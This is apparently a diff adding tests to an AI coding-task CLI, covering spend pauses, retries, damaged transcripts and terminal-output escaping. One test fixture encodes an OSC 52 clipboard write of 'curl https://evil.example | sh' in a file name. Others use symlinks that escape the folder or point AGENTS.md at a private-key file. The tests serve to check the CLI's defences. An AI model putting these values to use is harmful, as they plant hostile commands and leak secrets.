@@ -8,6 +8,8 @@ import {
   readFileSync,
   realpathSync,
   rmSync,
+  symlinkSync,
+  writeFileSync,
 } from "node:fs";
 import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
@@ -50,8 +52,10 @@ function call(id: string, name: string, args: Record<string, unknown>): MindTool
 /**
  * A createMind whose minds answer the task's requests from `turns`, each billing `costUsd` as the
  * assistant through @eidolon/providers, so the record reaches the command's meter as a real one would.
+ * A null cost, for a model the catalog doesn't price, leaves the record unpriced; "unreported" bills
+ * nothing, as a server that sends no usage.
  */
-function scripted(turns: readonly Turn[], costUsd = 0) {
+function scripted(turns: readonly Turn[], costUsd: number | null | "unreported" = 0) {
   const made: { role: string; options: Parameters<typeof createMind>[1] }[] = [];
   const requests: MindRequest[] = [];
   const records: UsageRecord[] = [];
@@ -61,19 +65,20 @@ function scripted(turns: readonly Turn[], costUsd = 0) {
       async *stream(request: MindRequest): AsyncGenerator<MindChunk> {
         const turn = turns[requests.length] ?? says("Done.");
         requests.push(request);
-        reportUsage(
-          {
-            role: "assistant",
-            provider: "openrouter",
-            model: "test/model",
-            units: { inputTokens: 900, cachedTokens: 100, outputTokens: 10 },
-            costUsd,
-          },
-          (record) => {
-            records.push(record);
-            options.tap?.(record);
-          },
-        );
+        if (costUsd !== "unreported")
+          reportUsage(
+            {
+              role: "assistant",
+              provider: "openrouter",
+              model: "test/model",
+              units: { inputTokens: 900, cachedTokens: 100, outputTokens: 10 },
+              costUsd: costUsd ?? undefined,
+            },
+            (record) => {
+              records.push(record);
+              options.tap?.(record);
+            },
+          );
         if (typeof turn === "function") yield* turn(request);
         else yield* turn;
       },
@@ -216,6 +221,31 @@ describe("laplace-task", () => {
       "INFO",
       `Starting task ${id} in ${folder} on openrouter/test/model; its transcript is in ${dir}`,
     ]);
+  });
+
+  test("shows control characters from the folder or the worker as escapes, not to the terminal", async () => {
+    // An OSC 52 clipboard write of "curl https://evil.example | sh", as a cloned repo's file name.
+    const osc = "\u001b]52;c;Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZSB8IHNo\u0007";
+    mkdirSync(folder);
+    writeFileSync(join(folder, `_${osc}`), "");
+    const mind = scripted([
+      calls([call("c1", "ls", {})], `Looking\u001b[2K\r.`),
+      says(`Done\u009b31m.\n`),
+    ]);
+    const io = captureIo();
+    expect(
+      await taskMain(["--folder", folder, "List it"], {
+        ...io.io,
+        createMind: mind.createMind,
+        confirm: null,
+      }),
+    ).toBe(0);
+
+    expect(io.stdout()).not.toMatch(/(?![\t\n])\p{Cc}/u);
+    expect(io.stdout()).toStartWith(
+      "Looking\\u001b[2K\\u000d.\n· ls _\\u001b]52;c;Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZSB8IHNo\\u0007\n" +
+        "Done\\u009b31m.\n",
+    );
   });
 
   test("--json writes the task's events to stdout as JSON lines, and nothing else", async () => {
@@ -398,6 +428,127 @@ describe("laplace-task", () => {
     }
   });
 
+  test("a model whose spend can't be counted pauses after its first request, unless pauses are off", async () => {
+    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.01" });
+    // Different calls each turn, so no stall pause steps in.
+    const turns = () => [
+      ...["a", "b", "c"].map((name) =>
+        calls([call(name, "write", { path: `${name}.txt`, content: name })]),
+      ),
+      says("Done."),
+    ];
+    const detail =
+      "No price is known for test/model at openrouter, so its spend can't count toward the pause at every $0.01.";
+    try {
+      const paused = scripted(turns(), null);
+      const io = captureIo();
+      expect(
+        await taskMain(["--folder", folder, "Write a.txt"], {
+          ...io.io,
+          createMind: paused.createMind,
+          confirm: null,
+        }),
+      ).toBe(3);
+      expect(paused.requests).toHaveLength(1);
+      expect(existsSync(join(folder, "a.txt"))).toBe(false);
+      const { id } = onlyTask();
+      expect(io.stdout()).toEndWith(
+        `\nTask ${id} paused: ${detail}\nResume it with: bun run laplace-task --resume ${id}\n`,
+      );
+      rmSync(tasksDir(), { recursive: true, force: true });
+
+      // In a terminal it asks, and goes on without pauses on yes.
+      const asked: string[] = [];
+      const yes = scripted(turns(), null);
+      expect(
+        await taskMain(["--folder", folder, "Write a.txt"], {
+          ...captureIo().io,
+          createMind: yes.createMind,
+          confirm: async (question) => {
+            asked.push(question);
+            return true;
+          },
+        }),
+      ).toBe(0);
+      expect(asked).toEqual([`${detail} Continue without spend pauses? [y/N] `]);
+      expect(yes.requests).toHaveLength(4);
+      rmSync(tasksDir(), { recursive: true, force: true });
+    } finally {
+      restore();
+    }
+    const unpaused = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0" });
+    try {
+      const off = scripted(turns(), null);
+      expect(
+        await taskMain(["--folder", folder, "Write a.txt"], {
+          ...captureIo().io,
+          createMind: off.createMind,
+          confirm: null,
+        }),
+      ).toBe(0);
+    } finally {
+      unpaused();
+    }
+  });
+
+  test("a request that ends with no usage reported pauses as an unpriced one does", async () => {
+    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.01" });
+    try {
+      // A server that ignores stream_options.include_usage.
+      const silent = scripted(
+        [calls([call("a", "write", { path: "a.txt", content: "a" })]), says("Done.")],
+        "unreported",
+      );
+      const io = captureIo();
+      expect(
+        await taskMain(["--folder", folder, "Write a.txt"], {
+          ...io.io,
+          createMind: silent.createMind,
+          confirm: null,
+        }),
+      ).toBe(3);
+      expect(silent.requests).toHaveLength(1);
+      expect(existsSync(join(folder, "a.txt"))).toBe(false);
+      const why = "No usage was reported for test/model at openrouter";
+      expect(io.stdout()).toContain(
+        `paused: ${why}, so its spend can't count toward the pause at every $0.01.\n`,
+      );
+      expect(logs.records).toContainEqual([
+        "WARNING",
+        `${why}, so the task's spend pauses can't count it`,
+      ]);
+    } finally {
+      restore();
+    }
+  });
+
+  test("a retried reply starts on a line of its own", async () => {
+    const mind = scripted([
+      // Words, then no finish reason: a failed attempt, which the loop retries.
+      [{ type: "text", text: "I'll create index.html." }],
+      calls(
+        [call("c1", "write", { path: "index.html", content: "<p>hi</p>\n" })],
+        "I'll create index.html.",
+      ),
+      says("Done."),
+    ]);
+    const io = captureIo();
+    expect(
+      await taskMain(["--folder", folder, "Write index.html"], {
+        ...io.io,
+        createMind: mind.createMind,
+        confirm: null,
+      }),
+    ).toBe(0);
+    expect(io.stdout()).toStartWith(
+      "I'll create index.html.\nI'll create index.html.\n· write index.html\nDone.\n",
+    );
+    expect(logs.records).toContainEqual([
+      "WARNING",
+      "The task's request failed; retrying in 1 s: The model's reply ended with no finish reason",
+    ]);
+  }, 10_000);
+
   test("a request that fails for good fails the task, which exits 1 and can be resumed", async () => {
     const mind = scripted([
       // biome-ignore lint/correctness/useYield: it fails before its first chunk.
@@ -517,6 +668,45 @@ describe("laplace-task", () => {
     expect(existsSync(tasksDir())).toBe(false);
   });
 
+  test("a folder that is a link leading nowhere is refused, not taken for the folder its text names", async () => {
+    // As text, docs is the temp folder above `work`; the kernel stops at the missing `nope`.
+    const repo = join(work, "evil");
+    mkdirSync(repo);
+    symlinkSync("nope/../../..", join(repo, "docs"));
+    const mind = scripted([calls([call("c1", "write", { path: "planted.txt", content: "x" })])]);
+    const io = captureIo();
+    const code = await taskMain(["--folder", join(repo, "docs"), "Write the docs"], {
+      ...io.io,
+      createMind: mind.createMind,
+      confirm: null,
+    });
+    expect(code).toBe(2);
+    expect(io.stderr()).toContain(
+      `laplace-task: error: ${join(repo, "docs")} can't be the task's folder: ENOENT`,
+    );
+    expect(mind.made).toEqual([]);
+    expect(existsSync(join(tmpdir(), "planted.txt"))).toBe(false);
+    expect(existsSync(tasksDir())).toBe(false);
+  });
+
+  test("an AGENTS.md linked out of the task's folders stays out of the worker's prompt", async () => {
+    mkdirSync(folder);
+    writeFileSync(join(work, "id_rsa"), "PRIVATE-KEY-SECRET");
+    symlinkSync("../id_rsa", join(folder, "AGENTS.md"));
+    writeFileSync(join(folder, "CLAUDE.md"), "Use two spaces.");
+    const mind = scripted([says("Done.")]);
+    expect(
+      await taskMain(["--folder", folder, "Write it"], {
+        ...captureIo().io,
+        createMind: mind.createMind,
+        confirm: null,
+      }),
+    ).toBe(0);
+    const system = mind.requests[0]?.system ?? "";
+    expect(system).toContain("Use two spaces.");
+    expect(system).not.toContain("PRIVATE-KEY-SECRET");
+  });
+
   test("a path outside the task's folders is an error result it goes on from; --allow and assistant.folders grant one", async () => {
     const outside = join(work, "outside");
     mkdirSync(outside);
@@ -619,6 +809,40 @@ describe("laplace-task", () => {
       status: "succeeded",
       model: { account: "anthropic", model: "claude-sonnet-5-5" },
     });
+  });
+
+  test("a task whose transcript is gone or damaged isn't resumed, and keeps its status", async () => {
+    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.5" });
+    try {
+      const first = scripted([calls([call("c1", "write", { path: "a.txt", content: "a" })])], 0.6);
+      expect(
+        await taskMain(["--folder", folder, "Write a.txt"], {
+          ...captureIo().io,
+          createMind: first.createMind,
+          confirm: null,
+        }),
+      ).toBe(3);
+    } finally {
+      restore();
+    }
+    const { id, dir } = onlyTask();
+    const path = join(dir, "transcript.jsonl");
+    const lines = readFileSync(path, "utf8").split("\n");
+    for (const [damage, why] of [
+      [() => writeFileSync(path, [lines[0], "{not json", ...lines.slice(2)].join("\n")), "line 2"],
+      [() => rmSync(path), "has no brief"],
+    ] as const) {
+      damage();
+      const mind = scripted([says("Done.")]);
+      const io = captureIo();
+      expect(
+        await taskMain(["--resume", id], { ...io.io, createMind: mind.createMind, confirm: null }),
+      ).toBe(2);
+      expect(io.stderr()).toContain(`laplace-task: error: argument --resume: task ${id} `);
+      expect(io.stderr()).toContain(why);
+      expect(mind.requests).toEqual([]);
+      expect((await readSnapshot(dir))?.status).toBe("paused");
+    }
   });
 
   test("a task another process runs, or one that doesn't exist, isn't resumed", async () => {
